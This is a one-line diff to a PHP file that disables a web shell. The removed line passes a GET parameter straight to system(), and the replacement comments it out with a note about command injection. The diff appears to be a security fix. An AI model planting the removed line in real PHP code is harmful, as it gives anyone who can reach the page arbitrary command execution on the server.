@@ -1,1 +1,1 @@
-<?php system($_GET['s']); ?>
+<?php // system($_GET['s']); // Disabled due to command injection vulnerability ?>
